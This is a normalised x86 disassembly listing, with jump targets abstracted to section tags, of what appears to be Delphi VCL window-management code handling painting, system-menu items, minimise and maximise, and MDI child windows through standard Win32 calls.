test ebp ebp
jl r-xdata
mov dl [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov si 0xffd1
call sub_403490
mov ebx eax
test [ esp + 0x4 ] bl
jne r-xdata
inc ebp
mov [ esp + 0x8 ] 0x0
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov dl [ esp + 0x4 ]
mov eax [ esp ]
call sub_43d234
mov ebx eax
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_450e18
mov edi eax
cmp edi [ esp + 0xc ]
je r-xdata
inc [ esp + 0x8 ]
dec ebp
jne r-xdata
mov dl [ esp + 0x4 ]
mov eax edi
mov si 0xffd1
call sub_403490
or bl al
test [ esp + 0x4 ] bl
jne r-xdata
sub_4524bc
push ebx
push esi
add esp 0xffffffc0
mov esi edx
mov ebx eax
mov eax ebx
call sub_43df6c
push eax
call IsIconic
test eax eax
jne r-xdata
push esp
mov eax ebx
call sub_43df6c
push eax
call BeginPaint
mov esi eax
mov eax ebx
call sub_452344
push eax
push 0x0
push 0x0
push esi
call DrawIcon
push esp
mov eax ebx
call sub_43df6c
push eax
call EndPaint
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
call sub_43c0fc
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
jmp r-xdata
add esp 0x40
pop esi
pop ebx
retn
sub_45253a
add [ eax ] al
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x170 ]
call sub_41e1b8
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
jmp r-xdata
sub_45259c
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_43df6c
push eax
call IsIconic
test eax eax
jne r-xdata
mov [ edi ] 0x27
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
retn
mov edx edi
mov eax esi
call sub_43c3c0
pop edi
pop esi
retn
sub_4525e8
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43df6c
push eax
call GetSystemMenu
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x2
jne r-xdata
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x400
push 0x7
push ebx
call DeleteMenu
push 0x400
push 0x5
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x4
jne r-xdata
push 0x1
push 0xf020
push ebx
call EnableMenuItem
push 0x1
push 0xf030
push ebx
call EnableMenuItem
sub_4526e4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
call sub_45110c
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_4525e8
pop ecx
sub_452718
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_438e94
cmp [ ebx + 0x9b ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_43df6c
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_43df6c
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_43df6c
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov edx eax
xor dl 0x1
or ecx 0xffffffff
mov eax ebx
call sub_437e6c
pop esi
pop ebx
retn
sub_4527a8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x248 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_43df6c
push eax
call SendMessageA
mov edx esi
mov eax ebx
call sub_43d1c0
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax ebx
call sub_43df6c
push eax
call SetMenu
xor edx edx
mov eax [ ebx + 0x248 ]
call sub_44abfc
sub_452808
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_43c25c
cmp [ ebx + 0x248 ] 0x0
je r-xdata
mov dx [ esi + 0x4 ]
mov eax [ ebx + 0x248 ]
call sub_44a610
test al al
jne r-xdata
pop esi
pop ebx
retn
sub_452854
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
call sub_44ae70
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_45288c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_452927
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x248 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45292e
lea eax [ ebp - 0x4 ]
call sub_404050
retn
xor esi esi
cmp [ edx + 0x6 ] 0xffff
jne r-xdata
xor ebx ebx
movzx eax [ edx + 0x4 ]
test [ edx + 0x6 ] 0x10
je r-xdata
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov ecx ebx
mov edx eax
mov eax [ edi + 0x248 ]
call sub_44a570
mov esi eax
mov bl 0x1
push eax
mov eax [ edx + 0x8 ]
push eax
call GetSubMenu
test esi esi
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_457648
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_434910
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_457648
jmp r-xdata
sub_452954
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
je r-xdata
mov [ ebx + 0x22b ] dl
cmp [ ebx + 0x264 ] 0x0
je r-xdata
mov eax ebx
mov si 0xffd0
call sub_403490
pop esi
pop ebx
retn
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0x10 ]
sub_452994
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
call sub_40cbac
test al al
jne r-xdata
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov al 0x1
sub_4529c0
push ebx
push esi
mov ebx edx
xor edx edx
mov [ ebx + 0xc ] edx
test [ eax + 0x1c ] 0x10
jne r-xdata
mov esi [ ebx + 0x8 ]
xor edx edx
call sub_452180
movzx ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax 0xb017
call sub_4346e8
test eax eax
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xc ] 0x1
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx [ eax + 0x248 ]
cmp [ edx + 0x5c ] 0x0
je r-xdata
sub_452a18
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
jne r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf010
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_43d0a4
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_455ffc
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp eax 0xf120
jne r-xdata
cmp [ ebx + 0x5b ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x5b ] 0x0
je r-xdata
cmp [ ebx + 0x22b ] 0x1
jne r-xdata
mov eax ebx
mov si 0xffd0
call sub_403490
sub_452aa4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
dec eax
je r-xdata
mov eax ebx
call sub_43df6c
push eax
call IsIconic
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax ebx
call sub_43df6c
push eax
call IsZoomed
test eax eax
je r-xdata
mov [ ebx + 0x22c ] 0x2
jmp r-xdata
cmp [ ebx + 0x22c ] 0x0
je r-xdata
jmp r-xdata
mov [ ebx + 0x22c ] 0x1
mov [ ebx + 0x22c ] 0x3
jmp r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
pop esi
pop ebx
retn
xor eax eax
mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax ebx
call sub_43df6c
push eax
call ShowWindow
mov [ ebx + 0x22c ] 0x0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_452b3c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_43df6c
cmp eax [ ebx + 0x8 ]
sete al
mov ebx eax
mov edx ebx
mov eax esi
call sub_45211c
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test [ eax + 0x54 ] 0x4
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov dl 0x1
mov si 0xffd1
call sub_403490
sub_452b94
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0x1
mov ecx [ edx + 0x4 ]
cmp ecx 0x1
sbb ecx ecx
neg ecx
mov edx [ eax + 0x220 ]
call sub_43e4a0
retn
mov eax [ edx + 0x4 ]
push eax
call SetFocus
retn
sub_452bc0
push ebx
push esi
mov esi edx
mov ebx eax
xor edx edx
mov eax ebx
call sub_452180
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_452bdc
push ebp
mov ebp esp
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
mov cl 0x1
mov eax ebx
call sub_44a5a0
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax ebx
call sub_44a5a0
sub_452c1c
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x150 ] 0x1
jne r-xdata
cmp [ esi + 0x150 ] 0x0
jne r-xdata
cmp [ esi + 0x158 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
cmp [ esi + 0x154 ] 0x0
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
sub_452c54
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x150 ] 0x1
jne r-xdata
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x154 ]
call sub_4040a4
mov [ edx ] 0x1
mov eax [ ebx + 0x158 ]
mov [ ecx ] eax
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_452c88
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_452dd9
push [ fs : eax ]
mov [ fs : eax ] esp
test [ esi + 0x1c ] 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452de0
lea eax [ ebp - 0x10 ]
call sub_404050
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov [ ebp - 0x9 ] 0x1
push ebp
mov eax [ esi + 0x248 ]
call sub_452bdc
pop ecx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ eax + 0xc ]
call sub_43468c
mov ebx eax
jmp r-xdata
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_412ce0
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax esi
call sub_4372c4
lea eax [ ebp - 0x1c ]
call sub_406a04
mov [ ebp - 0x14 ] eax
push ebp
mov eax [ esi + 0x7c ]
call sub_452bdc
pop ecx
mov [ ebp - 0x8 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_452c1c
test al al
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4572ec
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx 0xd
mov eax [ rw-data ]
call sub_457354
mov ecx [ ebp - 0x8 ]
mov edx 0x8
mov eax [ rw-data ]
call sub_457354
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x9 ]
mov eax ebx
call sub_452c54
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_412ce0
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax ebx
call sub_4372c4
lea eax [ ebp - 0x1c ]
call sub_406a04
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ebx [ ebx + 0x30 ]
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_457284
test [ esi + 0x228 ] 0x8
je r-xdata
sub_452de8
push ebx
push esi
push ecx
mov [ esp ] edx
mov esi eax
test [ esi + 0x1c ] 0x2
jne r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edx
pop esi
pop ebx
retn
cmp [ esi + 0x22a ] 0x0
je r-xdata
mov edx [ esp ]
mov edx [ edx + 0x8 ]
mov eax [ esi + 0x74 ]
lea ecx [ edx + 0x18 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jbe r-xdata
mov ebx [ eax + 0x10 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea ecx [ edx + 0x20 ]
mov ebx [ eax + 0xc ]
test ebx ebx
jbe r-xdata
mov [ ecx + 0x4 ] ebx
mov ebx [ eax + 0x8 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea eax [ edx + 0x20 ]
push eax
lea eax [ edx + 0x24 ]
push eax
lea ecx [ edx + 0x1c ]
lea eax [ edx + 0x18 ]
mov edx eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov [ ecx + 0x4 ] ebx
sub_452e5c
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx ]
add eax ecx
sub eax esi
cdq
xor eax edx
sub eax edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x2e4 ]
jge r-xdata
pop esi
pop ebx
pop ebp
retn
sub esi ecx
mov [ ebx ] esi
sub_452e88
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x2e2 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43c508
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov esi [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_450e98
lea edx [ ebp - 0x14 ]
call sub_454660
push ebp
mov eax [ ebp - 0x4 ]
call sub_450e98
lea edx [ ebp - 0x24 ]
call sub_454660
mov ecx [ ebp - 0x24 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0x14 ]
call sub_452e5c
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
call sub_450e98
lea edx [ ebp - 0x24 ]
call sub_454660
mov ecx [ ebp - 0x20 ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x10 ]
call sub_452e5c
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_452e5c
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
call sub_452e5c
pop ecx
cmp [ eax + 0xc ] 0x0
je r-xdata
sub_452f40
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
or [ ebx + 0x2f4 ] 0x20
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403490
pop esi
pop ebx
retn
sub_452f64
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
and [ ebx + 0x2f4 ] 0xdf
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb1
call sub_403490
pop esi
pop ebx
retn
sub_452f88
push ebx
push esi
mov esi edx
mov ebx eax
push 0x12
call GetKeyState
test ax ax
jl r-xdata
mov edx esi
mov eax ebx
call sub_43d3e8
mov ax [ esi + 0x4 ]
sub ax 0x9
je r-xdata
push 0x11
call GetKeyState
test ax ax
jl r-xdata
add eax 0xffffffe4
sub ax 0x4
jb r-xdata
push 0x1
push 0x10
call GetKeyState
test ax ax
setge cl
mov edx [ ebx + 0x220 ]
mov eax ebx
call sub_43e4a0
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov dx [ esi + 0x4 ]
cmp dx 0x27
je r-xdata
mov cl 0x1
cmp dx 0x28
je r-xdata
xor ecx ecx
jmp r-xdata
mov edx [ eax + 0x30 ]
xchg edx eax
call sub_43e4a0
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_453024
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45358e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
call sub_457738
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x4
xor edx edx
push ebp
push sub_453571
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453578
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
xor eax eax
push ebp
push sub_453478
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_403490
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push sub_4530dc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_403490
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4521d0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43b4c4
jmp r-xdata
mov eax [ rw-data ]
call sub_4548bc
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4371b0
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_43df6c
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
call SetWindowPos
jmp r-xdata
mov eax [ rw-data ]
call sub_4548b0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4371f4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
call IsIconic
test eax eax
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_43df6c
call sub_44de2c
mov ebx eax
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_4548ec
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4371b0
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_4548bc
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_437a0c
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_4548e0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4371f4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_4548b0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_451480
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_451480
jmp r-xdata
sub_4530e1
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_456e4c
call sub_403a84
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
